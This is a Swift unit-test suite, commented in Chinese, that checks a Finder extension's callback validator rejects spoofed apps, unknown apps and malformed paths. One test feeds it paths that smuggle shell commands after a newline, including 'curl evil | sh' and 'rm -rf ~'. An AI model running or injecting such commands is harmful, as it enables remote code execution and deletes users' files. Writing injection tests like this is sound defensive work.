import Foundation
import Testing
import betterfinder

/// 回调链接谁都能打开,主程序只能执行菜单本来就能产生的动作。
@Suite("增强Finder回调校验")
struct BetterFinderActionBridgeTests {
  private let path = "/Users/someone/Project"

  private func request(
    _ kind: BetterFinderActionRequestKind,
    app: BetterFinderApp? = nil,
    paths: [String],
    escapes: Bool = true
  ) throws -> BetterFinderActionRequest {
    let app = try app.map { String(decoding: try JSONEncoder().encode($0), as: UTF8.self) } ?? "null"
    let paths = String(decoding: try JSONEncoder().encode(paths), as: UTF8.self)
    return try BetterFinderActionRequest(jsonString: """
      {"kind":"\(kind.rawValue)","app":\(app),"urlPaths":\(paths),"escapesCopiedPaths":\(escapes)}
      """)
  }

  /// 走一遍扩展的真实路径:菜单项 → 请求 → 回调链接 → 解析 → 校验。
  private func roundTrip(_ preferences: BetterFinderPreferences) throws {
    let entries = BetterFinderMenuBuilder.entries(for: .toolbar, preferences: preferences)
      + BetterFinderMenuBuilder.entries(for: .contextMenu, preferences: preferences)
    #expect(!entries.isEmpty)
    for entry in entries {
      let sent = BetterFinderActionRequest(
        action: entry.action,
        urls: [URL(fileURLWithPath: path)],
        preferences: preferences
      )
      let url = try BetterFinderActionBridge.callbackURL(for: sent)
      let received = try BetterFinderActionBridge.request(from: url)
      #expect(try received.validated(against: preferences) == sent)
    }
  }

  @Test("默认菜单的每一项都放行")
  func defaultMenuPasses() throws {
    try roundTrip(.defaults)
  }

  @Test("自定义菜单的每一项都放行")
  func customMenuPasses() throws {
    var preferences = BetterFinderPreferences.defaults
    preferences.appliesCustomMenuToToolbar = true
    preferences.appliesCustomMenuToContextMenu = true
    preferences.customMenuApps = [
      BetterFinderApp(name: "Custom", type: .editor, path: "/Applications/Custom.app"),
      .supported(.visualStudioCode),
    ]
    try roundTrip(preferences)
  }

  @Test("菜单里没有的 App 不放行")
  func unknownAppRejected() throws {
    let calculator = BetterFinderApp(
      name: "Calculator", type: .editor, path: "/System/Applications/Calculator.app",
      bundleId: "com.apple.calculator")
    #expect(throws: BetterFinderActionBridgeError.self) {
      try request(.open, app: calculator, paths: [path]).validated(against: .defaults)
    }
  }

  /// 名字和类型对得上也不行:真正启动的是 bundleId / path。
  @Test("冒用菜单里的 App 名字不放行")
  func spoofedAppRejected() throws {
    var spoofed = BetterFinderPreferences.defaults.defaultEditor
    spoofed.bundleId = "com.apple.Terminal"
    #expect(throws: BetterFinderActionBridgeError.self) {
      try request(.open, app: spoofed, paths: [path]).validated(against: .defaults)
    }
  }

  @Test("open 请求缺 App 不放行")
  func openWithoutAppRejected() throws {
    #expect(throws: BetterFinderActionBridgeError.self) {
      try request(.open, paths: [path]).validated(against: .defaults)
    }
  }

  @Test("增强Finder关掉后什么都不放行")
  func disabledRejectsEverything() throws {
    var preferences = BetterFinderPreferences.defaults
    preferences.isEnabled = false
    #expect(throws: BetterFinderActionBridgeError.self) {
      try request(.copyPath, paths: [path]).validated(against: preferences)
    }
  }

  @Test("路径带控制字符或不是绝对路径都不放行", arguments: [
    "/tmp/x\ncurl evil | sh\n", "/tmp/x\rrm -rf ~", "/tmp/\u{1B}[2Jx", "relative/path", "",
  ])
  func invalidPathRejected(invalid: String) throws {
    let app = BetterFinderPreferences.defaults.defaultEditor
    #expect(throws: BetterFinderActionBridgeError.self) {
      try request(.copyPath, paths: [path, invalid]).validated(against: .defaults)
    }
    #expect(throws: BetterFinderActionBridgeError.self) {
      try request(.open, app: app, paths: [invalid]).validated(against: .defaults)
    }
  }

  /// 没选中文件时路径为空,后面退回桌面。
  @Test("空路径列表放行")
  func emptyPathsPass() throws {
    _ = try request(.copyPath, paths: []).validated(against: .defaults)
  }

  /// payload 关掉转义就能把带分号的路径原样塞进剪贴板,这个选项只认自己的配置。
  @Test("转义选项以配置为准")
  func escapingComesFromPreferences() throws {
    var preferences = BetterFinderPreferences.defaults
    preferences.escapesCopiedPaths = true
    let received = try request(.copyPath, paths: [path], escapes: false)
    #expect(try received.validated(against: preferences).escapesCopiedPaths)
  }
}
